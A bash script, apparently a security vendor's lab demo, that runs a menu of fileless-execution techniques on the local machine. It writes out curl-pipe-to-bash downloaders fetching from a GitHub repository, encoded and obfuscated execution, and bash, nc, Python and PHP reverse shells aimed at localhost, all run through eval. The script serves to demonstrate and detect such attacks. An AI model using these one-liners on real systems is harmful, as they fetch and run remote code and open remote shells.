#!/usr/bin/env bash
set -euo pipefail

############################  🎨 COLOURS  ################################
RESET=$(tput sgr0)  ; BOLD=$(tput bold)
RED=$(tput setaf 1) ; GREEN=$(tput setaf 2)
YELLOW=$(tput setaf 3) ; CYAN=$(tput setaf 6)

############################  🖼  BANNER  #################################
command -v figlet >/dev/null || { echo "figlet missing → sudo apt install figlet"; exit 1; }
clear
figlet "upwind.io"
echo -e "${CYAN}${BOLD}Fileless Execution Demonstration  –  Lior Boehm${RESET}\n"

############################  ⚙️  LAB SETUP  ##############################
LHOST="127.0.0.1"
LPORT1="4444"; LPORT2="5555"; LPORT3="9001"

RAW="https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main"

############################  🗡️  COMMANDS  ##############################
# Each attack has:  label | category | payload
read -r -d '' ATTACK_TABLE <<'EOF'
Pipe-to-bash|Downloaders|curl -s %RAW%/payload.sh | bash
FD-loader   |Downloaders|exec 3< <(curl -s %RAW%/payload.sh); bash /proc/self/fd/3
Reversed-URL|Downloaders|exec 3< <(echo 'hs.llehsdaolp/moc.buhtig.niam/omed-noitucexe-sselif/mbrloi//:sptth' | rev | xargs curl -s); bash /proc/self/fd/3
FD-bash-curl|Downloaders|exec 3< /bin/bash; /proc/self/fd/3 -c 'curl -s %RAW%/payload.sh | bash'
Heredoc-curl|Downloaders|/bin/sh -c "$(curl -s %RAW%/payload.sh)"

Base64-bash |Encoding   |echo 'ZWNobyAiQjY0IHBheWxvYWQgc3VjY2VzcyIK' | base64 -d | bash
ROT13+Base64|Encoding   |bash -c "$(echo 'ENFUGBYY' | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 -d)"
OpenSSL-FD  |Encoding   |exec 8< <(echo 'ZWNobyBoZWxsbw==' | base64 -d); bash /proc/self/fd/8
b64-loader  |Encoding   |bash -c "$(curl -s %RAW%/b64.txt | base64 -d)"

Bash-revsh  |ReverseShells|timeout 2s bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT1} 0>&1' &
NC-revsh    |ReverseShells|timeout 2s nc -e /bin/sh ${LHOST} ${LPORT1} &
Py-revsh    |ReverseShells|timeout 2s python3 -c 'import os,pty,socket,sys; s=socket.socket(); s.connect(("'${LHOST}'",'${LPORT2}')); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("/bin/sh")' &
Bash-9001   |ReverseShells|timeout 2s bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT3} 0>&1' &
PHP-revsh   |ReverseShells|timeout 2s php -r '$s=fsockopen("'${LHOST}'",7777); exec("/bin/sh -i <&3 >&3 2>&3");' &

Py-var-eval |AdvancedFD|X=$(curl -s %RAW%/test.py); python3 -c "$X"
Py-inline   |AdvancedFD|python3 -c 'import urllib.request, types; m=types.ModuleType("t"); exec(urllib.request.urlopen("%RAW%/test.py").read().decode(), m.__dict__)'
Obf-curl sed|AdvancedFD|bash -c "$(curl -s %RAW%/payload.sh | sed 's/PLACEHOLDER/real/')"
FD-chat     |AdvancedFD|exec {FD}<>/dev/tcp/${LHOST}/9898; echo whoami >&$FD; cat <&$FD &
dd+FD-curl  |AdvancedFD|exec 9< <(dd if=/dev/zero bs=0 count=0 | curl -s %RAW%/shell.sh); bash /proc/self/fd/9
Perl-dummy  |AdvancedFD|perl -MIO -e 'print q(dummy) if 1'
EOF

########################  ↔️  PARSE INTO ARRAYS  #########################
IFS=$'\n' read -r -d '' -a ROWS <<< "${ATTACK_TABLE}"$'\0'
declare -a labels categories payloads

for row in "${ROWS[@]}"; do
  IFS='|' read -r lbl cat pay <<< "${row}"
  labels+=("${lbl}")
  categories+=("${cat}")
  payloads+=("${pay//%RAW%/${RAW}}")   # substitute %RAW%
done

# Unique category list in display order
CATEGORY_LIST=(Downloaders Encoding ReverseShells AdvancedFD)

############################  🚀 RUNNER  #################################
run_attack() {
  local idx=$1
  echo -e "\n${YELLOW}[+] Attack #$((idx+1)) – ${labels[$idx]}${RESET}"
  echo -e "${GREEN}${payloads[$idx]}${RESET}\n"
  ( eval "${payloads[$idx]}" ) &
}

run_category() {
  local cat=$1
  echo -e "\n${CYAN}${BOLD}>>> Running category: ${cat}${RESET}"
  for i in "${!labels[@]}"; do
    [[ ${categories[$i]} == "${cat}" ]] && run_attack "$i"
  done
}

############################  🖥️  MENUS  #################################
while true; do
  echo -e "\n${BOLD}${CYAN}=========== MAIN MENU ===========${RESET}"
  for idx in "${!CATEGORY_LIST[@]}"; do
    echo -e "  $((idx+1))) ${BOLD}${CATEGORY_LIST[$idx]}${RESET}"
  done
  echo -e "  a) ${BOLD}Run ALL attacks${RESET}"
  echo -e "  q) ${BOLD}${RED}Quit${RESET}"
  read -rp $'\n'"Select category [1-${#CATEGORY_LIST[@]} | a | q]: " top

  case "$top" in
    [1-9])
      cat_idx=$((top-1))
      [[ $cat_idx -ge ${#CATEGORY_LIST[@]} ]] && { echo "${RED}Invalid${RESET}"; continue; }
      cat_name=${CATEGORY_LIST[$cat_idx]}

      ## SUB-MENU ##
      while true; do
        echo -e "\n${BOLD}${YELLOW}--- ${cat_name} ---${RESET}"
        mapfile -t subidxs < <( for i in "${!labels[@]}"; do [[ ${categories[$i]} == "${cat_name}" ]] && echo "$i"; done )
        for j in "${!subidxs[@]}"; do
          idx=${subidxs[$j]}
          printf "  %2d) %s\n" "$((j+1))" "${labels[$idx]}"
        done
        echo -e "  r) ${BOLD}Run entire category${RESET}"
        echo -e "  b) ${BOLD}Back${RESET}"
        read -rp $'\n'"Choice: " sub
        case "$sub" in
          [1-9])
            sel=$((sub-1))
            [[ $sel -ge ${#subidxs[@]} ]] && { echo "${RED}Invalid${RESET}"; continue; }
            run_attack "${subidxs[$sel]}"
            ;;
          [Rr]) run_category "${cat_name}" ;;
          [Bb]) break ;;
          *) echo "${RED}Invalid${RESET}" ;;
        esac
      done
      ;;
    [Aa])  for cat in "${CATEGORY_LIST[@]}"; do run_category "$cat"; done ;;
    [Qq])  echo -e "${RED}Bye!${RESET}"; exit 0 ;;
    *)     echo -e "${RED}Invalid${RESET}" ;;
  esac
done
